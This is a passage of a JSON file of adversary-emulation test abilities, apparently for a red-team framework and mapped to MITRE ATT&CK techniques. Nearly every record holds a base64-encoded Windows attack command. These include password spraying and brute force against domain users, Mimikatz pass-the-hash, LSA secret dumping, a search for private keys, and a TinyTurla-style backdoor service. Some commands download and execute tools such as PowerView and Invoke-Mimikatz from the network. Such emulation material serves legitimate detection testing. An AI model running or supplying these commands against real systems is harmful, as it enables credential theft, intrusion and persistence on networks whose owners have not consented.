gICB9OyB9OyBXcml0ZS1Ib3N0ICJFbmQgb2YgYnJ1dGVmb3JjZSI=", "ability_id": "ab197d18655e2ed6176453c7b88d3a11", "technique_name": "Brute Force: Password Guessing", "additional_info": {}, "privilege": "", "technique_id": "T1110.001", "platform": "windows", "name": "Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["5cb955_passwords.txt"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICI1Y2I5NTVfcGFzc3dvcmRzLnR4dCI="], "executor": "psh", "access": {}, "description": "Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos\n", "variations": []}, {"test": "Y21kIC9jIGNlcnR1dGlsIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvTElDRU5TRS50eHQgQXRvbWljLWxpY2Vuc2UudHh0", "ability_id": "c76968acda4aa1673dadcd67f3ab7664", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "certutil download (urlcache)", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIEF0b21pYy1saWNlbnNlLnR4dCA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!\n", "variations": []}, {"test": "cmVnIGFkZCAiSEtFWV9MT0NBTF9NQUNISU5FXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSIgL3Ygc2h1dGRvd253aXRob3V0bG9nb24gL3QgUkVHX0RXT1JEIC9kIDAgL2Y=", "ability_id": "b9446646de636e20af7be43a28804429", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "Disable Windows Shutdown Button", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSAiSEtFWV9MT0NBTF9NQUNISU5FXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSIgL3Ygc2h1dGRvd253aXRob3V0bG9nb24gL2YgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.\nSee how ransomware abuse this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/\n", "variations": []}, {"test": "Z2V0LUFEUHJpbmNpcGFsR3JvdXBNZW1iZXJzaGlwIGFkbWluaXN0cmF0b3IgfCBzZWxlY3QgbmFtZQ==", "ability_id": "775710727daed64ab5c67e0ac394ae87", "technique_name": "Permission Groups Discovery: Domain Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.002", "platform": "windows", "name": "Permission Groups Discovery PowerShell (Domain)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n", "variations": []}, {"test": "cG93ZXJzaGVsbCAtZW5jIFNRQkZBRmdBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR29BWlFCakFIUUFJQUJPQUdVQWRBQXVBRmNBWlFCaUFFTUFiQUJwQUdVQWJnQjBBQ2tBTGdCRUFHOEFkd0J1QUd3QWJ3QmhBR1FBVXdCMEFISUFhUUJ1QUdjQUtBQWlBR2dBZEFCMEFIQUFjd0E2QUM4QUx3QnlBR0VBZHdBdUFHY0FhUUIwQUdnQWRRQmlBSFVBY3dCbEFISUFZd0J2QUc0QWRBQmxBRzRBZEFBdUFHTUFid0J0QUM4QVJRQnRBSEFBYVFCeUFHVUFVQUJ5QUc4QWFnQmxBR01BZEFBdkFFVUFiUUJ3QUdrQWNnQmxBQzhBTndCaEFETUFPUUJoQURVQU5RQm1BREVBTWdBM0FHSUFNUUJoQUdVQVlnQTVBRFVBTVFCaUFETUFaQUE1QUdRQU9BQXdBR01BTmdCa0FHTUFOZ0EwQURVQU1BQXdBR01BWVFCakFHSUFOUUF2QUdRQVlRQjBBR0VBTHdCdEFHOEFaQUIxQUd3QVpRQmZBSE1BYndCMUFISUFZd0JsQUM4QVl3QnlBR1VBWkFCbEFHNEFkQUJwQUdFQWJBQnpBQzhBU1FCdUFIWUFid0JyQUdVQUxRQk5BR2tBYlFCcEFHc0FZUUIwQUhvQUxnQndBSE1BTVFBaUFDa0FPd0FnQUNRQWJRQWdBRDBBSUFCSkFHNEFkZ0J2QUdzQVpRQXRBRTBBYVFCdEFHa0Fhd0JoQUhRQWVnQWdBQzBBUkFCMUFHMEFjQUJEQUhJQVpRQmtBSE1BT3dBZ0FDUUFiUUFLQUE9PQ==", "ability_id": "ccdb8caf-c69e-424b-b930-551969450c57", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "PowerShell Invoke MimiKats", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Download", "variations": []}, {"test": "Y29weSAkUGF0aFRvQXRvbWljc0ZvbGRlclxUMTU0My4wMDNcYmluXHc2NHRpbWUuZGxsICVzeXN0ZW1yb290JVxzeXN0ZW0zMlwgJiYgc2MgY3JlYXRlIFc2NFRpbWUgYmluUGF0aD0gImM6XFdpbmRvd3NcU3lzdGVtMzJcc3ZjaG9zdC5leGUgLWsgVGltZVNlcnZpY2UiIHR5cGU9IHNoYXJlIHN0YXJ0PWF1dG8gJiYgc2MgY29uZmlnIFc2NFRpbWUgRGlzcGxheU5hbWU9ICJXaW5kb3dzIDY0IFRpbWUiICYmIHNjIGRlc2NyaXB0aW9uIFc2NFRpbWUgIk1haW50YWluIGRhdGUgYW5kIHRpbWUgc3luY2ggb24gYWxsIGNsaWVudHMgYW5kIHNlcnZpY2VzIGluIHRoZSBuZXR3b3JrIiAmJiByZWcgYWRkICJIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFN2Y2hvc3QiIC92IFRpbWVTZXJ2aWNlIC90IFJFR19NVUxUSV9TWiAvZCAiVzY0VGltZSIgL2YgJiYgcmVnIGFkZCAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcVzY0VGltZVxQYXJhbWV0ZXJzIiAvdiBTZXJ2aWNlRGxsIC90IFJFR19FWFBBTkRfU1ogL2QgIiVzeXN0ZW1yb290JVxzeXN0ZW0zMlx3NjR0aW1lLmRsbCIgL2YgJiYgc2Mgc3RhcnQgVzY0VGltZQ==", "ability_id": "ad5e362e8ea6667f42272230acc78243", "technique_name": "Create or Modify System Process: Windows Service", "additional_info": {}, "privilege": "", "technique_id": "T1543.003", "platform": "windows", "name": "TinyTurla backdoor service w64time", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c2Mgc3RvcCBXNjRUaW1lICYmIHNjLmV4ZSBkZWxldGUgVzY0VGltZSAmJiBkZWwgJXN5c3RlbXJvb3QlXHN5c3RlbTMyXHc2NHRpbWUuZGxsICYmIHJlZyBkZWxldGUgIkhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cU3ZjaG9zdCIgL3YgVGltZVNlcnZpY2UgL2YgJiYgcmVnIGRlbGV0ZSAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcVzY0VGltZVxQYXJhbWV0ZXJzIiAvdiBTZXJ2aWNlRGxsIC9m"], "executor": "cmd", "access": {}, "description": "It's running Dll as service to emulate the tine turla backdoor\n\n[Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)\n", "variations": []}, {"test": "dGFrZW93bi5leGUgL2YgJXRlbXAlXFQxMjIyLjAwMV90YWtlb3duX2ZvbGRlciAvcg==", "ability_id": "eab8a97ac4161b60d72b0a61f7f087d7", "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification", "additional_info": {}, "privilege": "", "technique_id": "T1222.001", "platform": "windows", "name": "Take ownership using takeown utility", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Modifies the filesystem permissions of the specified file or folder to take ownership of the object. Upon execution, \"SUCCESS\" will\nbe displayed for the folder and each file inside of it.\n", "variations": []}, {"test": "JXRtcCVcbWltaWthdHpceDY0XG1pbWlrYXR6LmV4ZSAic2VrdXJsc2E6OnB0aCAvdXNlcjpBZG1pbmlzdHJhdG9yIC9kb21haW46JXVzZXJkbnNkb21haW4lIC9udGxtOmNjMzZjZjdhODUxNDg5M2VmY2NkMzMyNDQ2NHRrZzFhIg==", "ability_id": "52f892665a18ab1279574bb2a7313fb1", "technique_name": "Use Alternate Authentication Material: Pass the Hash", "additional_info": {}, "privilege": "", "technique_id": "T1550.002", "platform": "windows", "name": "Mimikatz Pass the Hash", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Note: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n", "variations": []}, {"test": "UGF0aFRvQXRvbWljc0ZvbGRlclxUMTAwMy4wMDRcYmluXFBzRXhlYy5leGUgLWFjY2VwdGV1bGEgLXMgcmVnIHNhdmUgSEtMTVxzZWN1cml0eVxwb2xpY3lcc2VjcmV0cyAldGVtcCVcc2VjcmV0cyAveQ==", "ability_id": "f609f649d76bc42167d86a5a7aaccaf9", "technique_name": "OS Credential Dumping: LSA Secrets", "additional_info": {}, "privilege": "", "technique_id": "T1003.004", "platform": "windows", "name": "Dumping LSA Secrets", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICV0ZW1wJVxzZWNyZXRzID5udWwgMj4gbnVs"], "executor": "cmd", "access": {}, "description": "Dump secrets key from Windows registry\nWhen successful, the dumped file will be written to $env:Temp\\secrets.\nAttackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.\nhttps://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.\n", "variations": []}, {"test": "bmV0IHVzZSBcXCN7cmVtb3RlLmhvc3QuaXB9XGMkIC91c2VyOiN7ZG9tYWluLnVzZXIubmFtZX0gI3tkb21haW4udXNlci5wYXNzd29yZH07", "ability_id": "40161ad0-75bd-11e9-b475-0800200c9a66", "technique_name": "Remote Services: SMB/Windows Admin Shares", "additional_info": {}, "privilege": "", "technique_id": "T1021.002", "platform": "windows", "name": "Net use", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0IHVzZSBcXCN7cmVtb3RlLmhvc3QuaXB9XGMkIC9kZWxldGU7"], "executor": "psh", "access": {}, "description": "Mounts a network file share on a target computer", "variations": []}, {"test": "Zm9yZWFjaCgkaSBpbiBAKCIua2V5IiwiLnBncCIsIi5ncGciLCIucHBrIiwiLnAxMiIsIi5wZW0iLCIucGZ4IiwiLmNlciIsIi5wN2IiLCIuYXNjIiwiLmNydCIpKXtHZXQtQ2hpbGRJdGVtIC1QYXRoIGM6XCAtRGVwdGggMyAtRmlsZSAtUmVjdXJzZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7JF8ubmFtZSAtTWF0Y2ggIiRpJCJ9fQ==", "ability_id": "de632c2d-a729-4b77-b781-6a6b09c148ba", "technique_name": "Unsecured Credentials: Private Keys", "additional_info": {}, "privilege": "", "technique_id": "T1552.004", "platform": "windows", "name": "Find private keys", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Find private keys on the file system", "variations": []}, {"test": "JGVudjp1c2VybmFtZQ==", "ability_id": "c0da588f-79f0-4263-8998-7496b1a40596", "technique_name": "System Owner/User Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1033", "platform": "windows", "name": "Identify active user", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "relationships": [{"edge": "", "source": "host.user.name", "custom_parser_vals": {}, "target": ""}, {"edge": "", "source": "domain.user.name", "custom_parser_vals": {}, "target": ""}]}], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Find user running agent", "variations": []}, {"test": "KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vNDA0MmNiMzQzM2JjZTAyNGUzMDQ1MDBkY2ZlM2M1NTkwNTcxNTczYS9MSUNFTlNFLnR4dCcpIHwgT3V0LUZpbGUgTElDRU5TRS50eHQ7IEludm9rZS1JdGVtIExJQ0VOU0UudHh0", "ability_id": "0856c235a1d26113d4f2d92e39c9a9f8", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "File Download via PowerShell", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.\n", "variations": []}, {"test": "JFJlbW92YWJsZURyaXZlcz1AKCk7ICRSZW1vdmFibGVEcml2ZXMgPSBHZXQtV21pT2JqZWN0IC1DbGFzcyBXaW4zMl9Mb2dpY2FsRGlzayAtZmlsdGVyICJkcml2ZXR5cGU9MiIgfCBzZWxlY3Qtb2JqZWN0IC1leHBhbmRwcm9wZXJ0eSBEZXZpY2VJRDsgRm9yRWFjaCAoJERyaXZlIGluICRSZW1vdmFibGVEcml2ZXMpOyB7OyB3cml0ZS1ob3N0ICJSZW1vdmFibGUgRHJpdmUgRm91bmQ6IiAkRHJpdmU7IE5ldy1JdGVtIC1QYXRoICREcml2ZS9UMTA5MVRlc3QxLnR4dCAtSXRlbVR5cGUgImZpbGUiIC1Gb3JjZSAtVmFsdWUgIlQxMDkxIFRlc3QgMSBoYXMgY3JlYXRlZCB0aGlzIGZpbGUgdG8gc2ltdWxhdGUgbWFsd2FyZSBzcHJlYWQgdG8gcmVtb3ZhYmxlIGRyaXZlcy4iOyB9", "ability_id": "95f9e48ea1fbdac2f1c7c656b655ae4c", "technique_name": "Replication Through Removable Media", "additional_info": {}, "privilege": "", "technique_id": "T1091", "platform": "windows", "name": "USB Malware Spread Simulation", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JFJlbW92YWJsZURyaXZlcyA9IEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0xvZ2ljYWxEaXNrIC1maWx0ZXIgImRyaXZldHlwZT0yIiB8IHNlbGVjdC1vYmplY3QgLWV4cGFuZHByb3BlcnR5IERldmljZUlEOyBGb3JFYWNoICgkRHJpdmUgaW4gJFJlbW92YWJsZURyaXZlcyk7IHs7IFJlbW92ZS1JdGVtIC1QYXRoICREcml2ZVxUMTA5MVRlc3QxLnR4dCAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZTsgfQ=="], "executor": "psh", "access": {}, "description": "Simulates an adversary copying malware to all connected removable drives. \n", "variations": []}, {"test": "JGxvY2FsaXAgPSAoKGlwY29uZmlnIHwgZmluZHN0ciBbMC05XS5cLilbMF0pLlNwbGl0KClbLTFdOyAkcGllY2VzID0gJGxvY2FsaXAuc3BsaXQoIi4iKTsgJGZpcnN0T2N0ZXQgPSAkcGllY2VzWzBdOyAkc2Vjb25kT2N0ZXQgPSAkcGllY2VzWzFdOyAkdGhpcmRPY3RldCA9ICRwaWVjZXNbMl07IGZvcmVhY2ggKCRpcCBpbiAxLi4yNTUgfCAlIHsgIiRmaXJzdE9jdGV0LiRzZWNvbmRPY3RldC4kdGhpcmRPY3RldC4kXyIgfSApIHtjbWQuZXhlIC9jIG5zbG9va3VwICRpcH0=", "ability_id": "13a0c78dbd8d3645db69540bfe7cd038", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Remote System Discovery - nslookup", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.\n", "variations": []}, {"test": "c2MuZXhlIFxcI3tyZW1vdGUuaG9zdC5mcWRufSBjcmVhdGUgc2FuZHN2YyBzdGFydD0gZGVtYW5kIGVycm9yPSBpZ25vcmUgYmlucGF0aD0gImNtZCAvYyBzdGFydCBDOlxVc2Vyc1xQdWJsaWNcczRuZGM0dC5leGUgLXNlcnZlciAje3NlcnZlcn0gLXYgLW9yaWdpbkxpbmtJRCAje29yaWdpbl9saW5rX2lkfSIgZGlzcGxheW5hbWU9ICJTYW5kY2F0IEV4ZWN1dGlvbiI7c2MuZXhlIFxcI3tyZW1vdGUuaG9zdC5mcWRufSBzdGFydCBzYW5kc3ZjO1N0YXJ0LVNsZWVwIC1zIDE1O0dldC1Qcm9jZXNzIC1Db21wdXRlck5hbWUgI3tyZW1vdGUuaG9zdC5mcWRufSBzNG5kYzR0Ow==", "ability_id": "95727b87-175c-4a69-8c7a-a5d82746a753", "technique_name": "System Services: Service Execution", "additional_info": {}, "privilege": "", "technique_id": "T1569.002", "platform": "windows", "name": "Service Creation", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 300, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c2MuZXhlIFxcI3tyZW1vdGUuaG9zdC5mcWRufSBzdG9wIHNhbmRzdmM7CnNjLmV4ZSBcXCN7cmVtb3RlLmhvc3QuZnFkbn0gZGVsZXRlIHNhbmRzdmMgL2Y7CnRhc2traWxsIC9zIFxcI3tyZW1vdGUuaG9zdC5mcWRufSAvRkkgIkltYWdlbmFtZSBlcSBzNG5kYzR0LmV4ZSI="], "executor": "psh", "access": {}, "description": "Create a service named \"sandsvc\" to execute remote 54ndc57 binary named \"s4ndc4t.exe\"", "variations": []}, {"test": "UkVHIFFVRVJZIEhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcQ3J5cHRvZ3JhcGh5IC92IE1hY2hpbmVHdWlk", "ability_id": "98c8abc9362d5a3da76d23980572b5e2", "technique_name": "System Information Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1082", "platform": "windows", "name": "Windows MachineGUID Discovery", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.\n", "variations": []}, {"test": "bmV0c3RhdCAmJiBuZXQgdXNlICYmIG5ldCBzZXNzaW9ucw==", "ability_id": "a14392d713dffba6a397682ff83259a0", "technique_name": "System Network Connections Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1049", "platform": "windows", "name": "System Network Connections Discovery", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Get a listing of network connections.\n\nUpon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.\n", "variations": []}, {"test": "JEFjdGlvbiA9IE5ldy1TY2hlZHVsZWRUYXNrQWN0aW9uIC1FeGVjdXRlICJjYWxjLmV4ZSI7ICRUcmlnZ2VyID0gTmV3LVNjaGVkdWxlZFRhc2tUcmlnZ2VyIC1BdExvZ29uOyAkVXNlciA9IE5ldy1TY2hlZHVsZWRUYXNrUHJpbmNpcGFsIC1Hcm91cElkICJCVUlMVElOXEFkbWluaXN0cmF0b3JzIiAtUnVuTGV2ZWwgSGlnaGVzdDsgJFNldCA9IE5ldy1TY2hlZHVsZWRUYXNrU2V0dGluZ3NTZXQ7ICRvYmplY3QgPSBOZXctU2NoZWR1bGVkVGFzayAtQWN0aW9uICRBY3Rpb24gLVByaW5jaXBhbCAkVXNlciAtVHJpZ2dlciAkVHJpZ2dlciAtU2V0dGluZ3MgJFNldDsgUmVnaXN0ZXItU2NoZWR1bGVkVGFzayBBdG9taWNUYXNrIC1JbnB1dE9iamVjdCAkb2JqZWN0", "ability_id": "ba8ddc38c7c6ced12fecc0d695c5e57c", "technique_name": "Scheduled Task/Job: Scheduled Task", "additional_info": {}, "privilege": "", "technique_id": "T1053.005", "platform": "windows", "name": "Powershell Cmdlet Scheduled Task", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["VW5yZWdpc3Rlci1TY2hlZHVsZWRUYXNrIC1UYXNrTmFtZSAiQXRvbWljVGFzayIgLWNvbmZpcm06JGZhbHNlID4kbnVsbCAyPiYx"], "executor": "psh", "access": {}, "description": "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.\n", "variations": []}, {"test": "SW5mRGVmYXVsdEluc3RhbGwuZXhlIDY3ZDA3ZV9JbmZkZWZhdWx0aW5zdGFsbC5pbmY=", "ability_id": "0d868d5a34b3b81385218ef65ba4477e", "technique_name": "Signed Binary Proxy Execution", "additional_info": {}, "privilege": "", "technique_id": "T1218", "platform": "windows", "name": "InfDefaultInstall.exe .inf Execution", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["67d07e_Infdefaultinstall.inf"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n", "variations": []}, {"test": "R2V0LVNlcnZpY2U=", "ability_id": "c6607391-d02c-44b5-9b13-d3492ca58599", "technique_name": "System Service Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1007", "platform": "windows", "name": "Discover system services", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Identify system services", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvbWFzdGVyL1JlY29uL1Bvd2VyVmlldy5wczEnIC1Vc2VCYXNpY1BhcnNpbmcpOyBHZXQtRG9tYWluR3JvdXAgLXZlcmJvc2U=", "ability_id": "57781057e51ffecf21e38fd31c9d2f79", "technique_name": "Permission Groups Discovery: Domain Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.002", "platform": "windows", "name": "Get-DomainGroup with PowerView", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.\n", "variations": []}, {"test": "YXNzb2MgLmh0YT10eHRmaWxl", "ability_id": "2af16dd43e4569a2d179ac46076a07d7", "technique_name": "Event Triggered Execution: Change Default File Association", "additional_info": {}, "privilege": "", "technique_id": "T1546.001", "platform": "windows", "name": "Change Default File Association", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["YXNzb2MgIC5odGE9aHRhZmlsZQ=="], "executor": "cmd", "access": {}, "description": "Change Default File Association From cmd.exe of hta to notepad.\n\nUpon successful execution, cmd.exe will change the file association of .hta to notepad.exe. \n", "variations": []}, {"test": "QEZPUiAvRiAlbiBpbiAoJXRlbXAlXHVzZXJzLnR4dCkgZG8gQGVjaG8gfCBzZXQvcD0uICYgQG5ldCB1c2UgJWxvZ29uc2VydmVyJVxJUEMkIC91c2VyOiIldXNlcmRvbWFpbiVcJW4iICIje3Bhc3N3b3JkfSIgMT5OVUwgMj4mMSAmJiBAZWNobyBbKl0gJW46I3twYXNzd29yZH0gJiYgQG5ldCB1c2UgL2RlbGV0ZSAlbG9nb25zZXJ2ZXIlXElQQyQgPiBOVUw=", "ability_id": "8c4976ae3659f80e631907fea0690a24", "technique_name": "Brute Force: Password Spraying", "additional_info": {}, "privilege": "", "technique_id": "T1110.003", "platform": "windows", "name": "Password Spray all Domain Users", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.\nThis atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\\users.txt list. Any successful authentications will be printed to the screen with a message like \"[*] username:password\", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.\nUse the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.\nSee the \"Windows FOR Loop Password Spraying Made Easy\" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5", "variations": []}, {"test": "JHVybD0naHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9mNjUwNTIwYzRiMTAwNGRhZjhiM2VjMDgwMDdhMGI5NDViOTEyNTNhL0V4ZmlsdHJhdGlvbi9JbnZva2UtTWltaWthdHoucHMxJzskd3NoZWxsPU5ldy1PYmplY3QgLUNvbU9iamVjdCBXU2NyaXB0LlNoZWxsOyRyZWc9J0hLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxOb3RlcGFkJzskYXBwPSdOb3RlcGFkJzskcHJvcHM9KEdldC1JdGVtUHJvcGVydHkgJHJlZyk7W1ZvaWRdW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgnU3lzdGVtLldpbmRvd3MuRm9ybXMnKTtAKEAoJ2lXaW5kb3dQb3NZJywoW1N0cmluZ10oW1N5c3RlbS5XaW5kb3dzLkZvcm1zLlNjcmVlbl06OkFsbFNjcmVlbnMpKS5TcGxpdCgnfScpWzBdLlNwbGl0KCc9JylbNV0pLEAoJ1N0YXR1c0JhcicsMCkpfEZvckVhY2h7U1AgJHJlZyAoSXRlbSBWYXJpYWJsZTpfKS5WYWx1ZVswXSAoVmFyaWFibGUgXykuVmFsdWVbMV19OyRjdXJwaWQ9JHdzaGVsbC5FeGVjKCRhcHApLlByb2Nlc3NJRDtXaGlsZSghKCR0aXRsZT1HUFN8P3soSXRlbSBWYXJpYWJsZTpfKS5WYWx1ZS5pZC1pZXEkY3VycGlkfXxGb3JFYWNoeyhWYXJpYWJsZSBfKS5WYWx1ZS5NYWluV2luZG93VGl0bGV9KSl7U3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA1MDB9O1doaWxlKCEkd3NoZWxsLkFwcEFjdGl2YXRlKCR0aXRsZSkpe1N0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNTAwfTskd3NoZWxsLlNlbmRLZXlzKCdebycpO1N0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNTAwO0AoJHVybCwoJyAnKjEwMDApLCd+Jyl8Rm9yRWFjaHskd3NoZWxsLlNlbmRLZXlzKChWYXJpYWJsZSBfKS5WYWx1ZSl9OyRyZXM9JE51bGw7V2hpbGUoJHJlcy5MZW5ndGggLWx0IDIpe1tXaW5kb3dzLkZvcm1zLkNsaXBib2FyZF06OkNsZWFyKCk7QCgnXmEnLCdeYycpfEZvckVhY2h7JHdzaGVsbC5TZW5kS2V5cygoSXRlbSBWYXJpYWJsZTpfKS5WYWx1ZSl9O1N0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNTAw